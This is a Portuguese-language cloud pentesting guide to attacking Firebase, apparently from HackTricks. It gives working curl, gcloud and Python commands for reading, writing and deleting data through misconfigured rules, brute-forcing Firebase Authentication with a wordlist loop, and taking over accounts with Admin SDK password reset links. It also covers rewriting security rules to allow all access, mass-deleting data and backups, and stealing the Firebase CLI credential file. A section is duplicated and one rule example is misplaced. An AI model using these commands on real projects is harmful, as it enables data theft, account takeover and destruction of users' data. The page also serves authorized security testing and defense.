# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Unauthenticated access to Firebase Realtime Database
Um atacante não precisa de permissões específicas do Firebase para realizar este ataque. É necessário apenas que haja uma configuração vulnerável nas regras de segurança do Firebase Realtime Database, onde as regras estão definidas com `.read: true` ou `.write: true`, permitindo acesso público de leitura ou escrita.

O atacante deve identificar a URL do banco de dados, que normalmente segue o formato: `https://<project-id>.firebaseio.com/`.

Essa URL pode ser encontrada através de mobile application reverse engineering (decompiling Android APKs or analyzing iOS apps), analisando arquivos de configuração como google-services.json (Android) ou GoogleService-Info.plist (iOS), inspecionando o código-fonte de aplicações web, ou examinando o tráfego de rede para identificar requisições para domínios `*.firebaseio.com`.

O atacante identifica a URL do banco de dados e verifica se ela está exposta publicamente, então acessa os dados e potencialmente escreve informações maliciosas.

Primeiro, eles verificam se o banco de dados permite acesso de leitura ao adicionar .json à URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Se a resposta contiver dados JSON ou null (em vez de "Permission Denied"), o banco de dados permite acesso de leitura. Para verificar o acesso de escrita, o atacante pode tentar enviar uma requisição de escrita de teste usando a Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Se a operação for bem-sucedida, o banco de dados também permite write access.

### Exposição de dados no Cloud Firestore
Um attacker não precisa de permissões específicas do Firebase para executar este ataque. É necessário apenas que exista uma configuração vulnerável nas regras de segurança do Cloud Firestore em que as regras permitem read or write access sem authentication ou com validação insuficiente. Um exemplo de uma regra mal configurada que concede full access é:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Essa regra permite que qualquer pessoa leia e escreva todos os documentos sem quaisquer restrições. As regras do Firestore são granulares e se aplicam por coleção e documento, portanto um erro em uma regra específica pode expor apenas determinadas coleções.

O atacante deve identificar o Firebase Project ID, que pode ser encontrado através de mobile app reverse engineering, análise de arquivos de configuração como google-services.json ou GoogleService-Info.plist, inspeção do código-fonte de aplicações web, ou análise do tráfego de rede para identificar requisições a firestore.googleapis.com.
A Firestore REST API usa o formato:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Se as regras permitirem acesso de leitura não autenticado, o atacante pode ler coleções e documentos. Primeiro, ele tenta acessar uma coleção específica:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Se a resposta contiver documentos JSON em vez de um erro de permissão, a coleção está exposta. O atacante pode enumerar todas as coleções acessíveis tentando nomes comuns ou analisando a estrutura da aplicação. Para acessar um documento específico:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Se as regras permitirem unauthenticated write access ou tiverem validação insuficiente, o attacker pode criar novos documentos:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Para modificar um documento existente, deve-se utilizar PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Para eliminar um documento e causar uma negação de serviço:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Exposição de arquivos no Firebase Storage
Um atacante não precisa de permissões específicas do Firebase para realizar este ataque. Basta que exista uma configuração vulnerável nas regras de segurança do Firebase Storage, em que as regras permitem acesso read ou write sem autenticação ou com validação insuficiente. As Storage rules controlam as permissões de read e write de forma independente, portanto um erro em uma regra pode expor apenas o acesso read, apenas o acesso write, ou ambos. Um exemplo de regra mal configurada que concede acesso total é:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Esta regra permite acesso de leitura e escrita a todos os documentos sem quaisquer restrições. As regras do Firestore são granulares e aplicadas por coleção e por documento, portanto um erro em uma regra específica pode expor apenas determinadas coleções. O atacante deve identificar o Firebase Project ID, que pode ser encontrado por meio de engenharia reversa de aplicativos móveis, análise de arquivos de configuração como google-services.json ou GoogleService-Info.plist, inspeção do código-fonte da aplicação web, ou análise do tráfego de rede para identificar requisições para firestore.googleapis.com.
A REST API do Firestore usa o formato:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Se as regras permitirem acesso de leitura não autenticado, o atacante pode ler coleções e documentos. Primeiro, ele tenta acessar uma coleção específica.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Se a resposta contiver a lista de arquivos em vez de um erro de permissão, o arquivo está exposto. O atacante pode visualizar o conteúdo dos arquivos especificando seu caminho:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Se as regras permitirem acesso de escrita não autenticado ou tiverem validação insuficiente, o atacante pode enviar arquivos maliciosos. Para enviar um arquivo através da REST API:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
O atacante pode fazer upload de code shells, malware payloads ou arquivos grandes para causar uma denial of service. Se a aplicação processar ou executar os arquivos enviados, o atacante pode obter remote code execution. Para excluir arquivos e causar uma denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Invocação pública de Firebase Cloud Functions
Um atacante não precisa de permissões específicas do Firebase para explorar esse problema; basta que uma Cloud Function seja acessível publicamente via HTTP sem autenticação.

Uma função é vulnerável quando está configurada de forma insegura:

- Usa functions.https.onRequest, que não impõe autenticação (ao contrário de onCall functions).
- O código da função não valida a autenticação do usuário (por exemplo, sem verificações de request.auth ou context.auth).
- A função é acessível publicamente no IAM, ou seja, allUsers possui o papel roles/cloudfunctions.invoker. Este é o comportamento padrão para HTTP functions, a menos que o desenvolvedor restrinja o acesso.

Firebase HTTP Cloud Functions são expostas através de URLs como:

- https://<region>-<project-id>.cloudfunctions.net/<function-name>
- https://<project-id>.web.app/<function-name> (when integrated with Firebase Hosting)

Um atacante pode descobrir essas URLs por meio de análise do código-fonte, inspeção do tráfego de rede, ferramentas de enumeração ou engenharia reversa de apps móveis.
Se a função estiver exposta publicamente e sem autenticação, o atacante pode invocá-la diretamente sem credenciais.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Se a função não validar corretamente os inputs, o atacante pode tentar outros ataques, como code injection ou command injection.


### Brute-force attack contra Firebase Authentication com uma política de senha fraca
Um atacante não precisa de permissões específicas do Firebase para executar este ataque. Ele só requer que a Firebase API Key esteja exposta em aplicações mobile ou web, e que a política de senhas não tenha sido configurada com requisitos mais rígidos que os padrões.

O atacante deve identificar a Firebase API Key, que pode ser encontrada através de mobile app reverse engineering, análise de arquivos de configuração como google-services.json ou GoogleService-Info.plist, inspeção do código-fonte de aplicações web (por exemplo, em bootstrap.js), ou análise do tráfego de rede.

A REST API do Firebase Authentication usa o endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
para autenticar com email e senha.

Se Email Enumeration Protection estiver desabilitado, as respostas de erro da API podem revelar se um email existe no sistema (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), o que permite aos atacantes enumerar usuários antes de tentar adivinhar senhas. Quando essa proteção está habilitada, a API retorna a mesma mensagem de erro tanto para emails inexistentes quanto para senhas incorretas, impedindo a enumeração de usuários.

É importante notar que o Firebase Authentication aplica rate limiting, que pode bloquear requisições se muitas tentativas de autenticação ocorrerem em pouco tempo. Por isso, o atacante teria que introduzir delays entre as tentativas para evitar ser rate-limited.

O atacante identifica a API Key e realiza tentativas de autenticação com múltiplas senhas contra contas conhecidas. Se Email Enumeration Protection estiver desabilitado, o atacante pode enumerar usuários existentes analisando as respostas de erro:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Se a resposta contiver EMAIL_NOT_FOUND, o e-mail não existe no sistema. Se contiver INVALID_PASSWORD, o e-mail existe, mas a senha está incorreta, confirmando que o usuário está registrado. Uma vez que um usuário válido é identificado, o atacante pode realizar tentativas de brute-force. É importante incluir pausas entre as tentativas para evitar os mecanismos de rate-limiting do Firebase Authentication:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Com a política de senha padrão (mínimo de 6 caracteres, sem requisitos de complexidade), o atacante pode tentar todas as combinações possíveis de senhas de 6 caracteres, o que representa um espaço de busca relativamente pequeno em comparação com políticas de senha mais rígidas.

### Gerenciamento de usuários no Firebase Authentication

O atacante precisa de permissões específicas do Firebase Authentication para realizar este ataque. As permissões necessárias são:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Essas permissões estão incluídas na role `roles/firebaseauth.admin`, que concede acesso total de leitura/gravação aos recursos do Firebase Authentication. Elas também estão incluídas em roles de nível superior, como `roles/firebase.developAdmin` (que inclui todas as permissões firebaseauth.*) e `roles/firebase.admin` (acesso total a todos os serviços do Firebase).

Para usar o Firebase Admin SDK, o atacante precisaria de acesso às credenciais da service account (arquivo JSON), que podem ser encontradas em sistemas comprometidos, repositórios de código expostos publicamente, sistemas CI/CD comprometidos ou pela violação de contas de desenvolvedores que têm acesso a essas credenciais.

O primeiro passo é configurar o Firebase Admin SDK usando as credenciais da service account.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Para criar um usuário malicioso usando o e-mail da victim, o attacker tentaria usar o Firebase Admin SDK para gerar uma nova conta com esse e-mail.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Para modificar um usuário existente, o atacante atualizaria campos como o endereço de email, o status de verificação ou se a conta está desativada.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Para excluir uma conta de usuário e causar uma denial of service, o attacker enviaria uma solicitação para remover o usuário completamente.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
O atacante também pode recuperar informações sobre usuários existentes solicitando seu UID ou endereço de e-mail.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Além disso, o atacante poderia gerar links de verificação ou links de redefinição de senha para alterar a senha de um usuário e obter acesso à sua conta.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Gerenciamento de usuários no Firebase Authentication
Um atacante precisa de permissões específicas do Firebase Authentication para realizar este ataque. As permissões necessárias são:

- `firebaseauth.users.create` para criar usuários
- `firebaseauth.users.update` para modificar usuários existentes
- `firebaseauth.users.delete` para excluir usuários
- `firebaseauth.users.get` para obter informações de usuários
- `firebaseauth.users.sendEmail` para enviar e-mails aos usuários
- `firebaseauth.users.createSession` para criar sessões de usuário

Estas permissões estão incluídas na role `roles/firebaseauth.admin`, que concede acesso completo de leitura/gravação aos recursos do Firebase Authentication. Elas também fazem parte de roles de nível superior como `roles/firebase.developAdmin` (que inclui todas as permissões firebaseauth.*) e `roles/firebase.admin` (acesso total a todos os serviços do Firebase).

Para usar o Firebase Admin SDK, o atacante precisaria de acesso às credenciais da conta de serviço (um arquivo JSON), que poderiam ser obtidas a partir de sistemas comprometidos, repositórios de código expostos publicamente, ambientes CI/CD comprometidos ou através do comprometimento de contas de desenvolvedor que tenham acesso a essas credenciais.

O primeiro passo é configurar o Firebase Admin SDK usando as credenciais da conta de serviço.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Para criar um usuário malicioso usando o e-mail da vítima, o atacante tentaria criar uma nova conta de usuário com esse e-mail, atribuindo sua própria senha e informações de perfil.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Para modificar um usuário existente, o atacante alteraria campos como o endereço de e-mail, o status de verificação ou se a conta está desativada.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Para excluir uma conta de usuário—efetivamente causando um denial of service—o atacante enviaria uma solicitação para remover esse usuário permanentemente.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
O atacante também poderia recuperar informações sobre usuários existentes, como seu UID ou email, solicitando detalhes do usuário por UID ou por endereço de email.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Além disso, o atacante poderia gerar links de verificação ou links de redefinição de senha, permitindo que alterasse a senha de um usuário e assumisse o controle da conta.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Modificação das regras de segurança nos serviços Firebase
O atacante precisa de permissões específicas para modificar as regras de segurança, dependendo do serviço. Para Cloud Firestore e Firebase Cloud Storage, as permissões necessárias são `firebaserules.rulesets.create` para criar rulesets e `firebaserules.releases.create` para implantar releases. Essas permissões estão incluídas na função `roles/firebaserules.admin` ou em funções de nível superior, como `roles/firebase.developAdmin` e `roles/firebase.admin`. Para Firebase Realtime Database, a permissão necessária é `firebasedatabase.instances.update`.

O atacante deve usar a Firebase REST API para modificar as regras de segurança. Primeiro, o atacante precisa obter um token de acesso usando credenciais de conta de serviço.
Para obter o token:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Para modificar as regras do Firebase Realtime Database:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Para modificar as regras do Cloud Firestore, o atacante deve criar um ruleset e então fazer o deploy dele:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
O comando anterior retorna um nome de ruleset no formato projects/<project-id>/rulesets/<ruleset-id>. Para implantar a nova versão, a release deve ser atualizada usando uma requisição PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Para modificar as regras do Firebase Cloud Storage:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
O comando anterior retorna um nome de ruleset no formato projects/<project-id>/rulesets/<ruleset-id>. Para implantar a nova versão, o release deve ser atualizado usando uma requisição PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Exfiltração e manipulação de dados no Cloud Firestore
Cloud Firestore utiliza a mesma infraestrutura e o mesmo sistema de permissões do Cloud Datastore, então as permissões do Datastore IAM se aplicam diretamente ao Firestore. Para manipular políticas de TTL, é necessária a permissão `datastore.indexes.update`. Para exportar dados, é necessária a permissão `datastore.databases.export`. Para importar dados, é necessária a permissão `datastore.databases.import`. Para realizar exclusão em massa de dados, é necessária a permissão `datastore.databases.bulkDelete`.

Para operações de backup e restauração, são necessárias permissões específicas:

- `datastore.backups.get` e `datastore.backups.list` para listar e obter detalhes dos backups disponíveis
- `datastore.backups.delete` para excluir backups
- `datastore.backups.restoreDatabase` para restaurar um banco de dados a partir de um backup
- `datastore.backupSchedules.create` e `datastore.backupSchedules.delete` para gerenciar cronogramas de backup

Quando uma política de TTL é criada, uma propriedade designada é selecionada para identificar entidades elegíveis para exclusão. Essa propriedade de TTL deve ser do tipo Date and time. O atacante pode escolher uma propriedade que já exista ou designar uma propriedade que pretende adicionar mais tarde. Se o valor do campo for uma data no passado, o documento torna-se elegível para exclusão imediata. O atacante pode usar o gcloud CLI para manipular políticas de TTL.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Para exportar dados e exfiltrá-los, o atacante poderia usar o gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Para importar dados maliciosos:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Para realizar a remoção massiva de dados e causar um denial of service, o attacker poderia usar o gcloud Firestore bulk-delete tool para remover coleções inteiras.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Para operações de backup e restauração, o atacante poderia criar backups agendados para capturar o estado atual do banco de dados, listar backups existentes, restaurar a partir de um backup para sobrescrever alterações recentes, excluir backups para causar perda permanente de dados e remover backups agendados.
Para criar um agendamento de backup diário que gere imediatamente um backup:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Para restaurar a partir de um backup específico, the attacker poderia criar um novo banco de dados usando os dados contidos nesse backup. A operação de restauração grava os dados do backup em um novo banco de dados, o que significa que um DATABASE_ID existente não pode ser usado.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Para excluir um backup e causar perda permanente de dados:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Roubo e uso indevido das credenciais do Firebase CLI
Um atacante não precisa de permissões específicas do Firebase para realizar este ataque, mas precisa de acesso ao sistema local do desenvolvedor ou ao arquivo de credenciais do Firebase CLI. Essas credenciais estão armazenadas em um arquivo JSON localizado em:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Esse arquivo contém tokens de autenticação, incluindo refresh_token e access_token, que permitem ao atacante autenticar-se como o usuário que executou originalmente firebase login.

O atacante obtém acesso ao arquivo de credenciais do Firebase CLI. Em seguida, pode copiar o arquivo inteiro para seu próprio sistema, e o Firebase CLI usará automaticamente as credenciais a partir de sua localização padrão. Depois disso, o atacante poderá ver todos os projetos Firebase acessíveis a esse usuário.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
